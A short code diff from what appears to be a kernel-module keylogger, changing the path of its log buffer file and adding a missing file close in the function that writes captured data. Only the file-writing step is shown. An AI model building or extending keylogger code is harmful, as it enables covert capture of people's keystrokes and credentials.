@@ -69,9 +69,10 @@ void writeToFile(char* data)
 {
     //first step is to open the file
     //use O_CREAT flag to create file if it doesn't exist
-    struct file* file = file_open("/proc/keylog/buffer.txt", O_APPEND, O_RDWR);
+    struct file* file = file_open("/keylog/buffer.txt", O_APPEND, O_RDWR);
     int writeStatus = file_write(file, &file->f_pos, data, strlen(data));
     int syncStatus = file_sync(file);
+    file_close(file);
     
 }
 //my code end
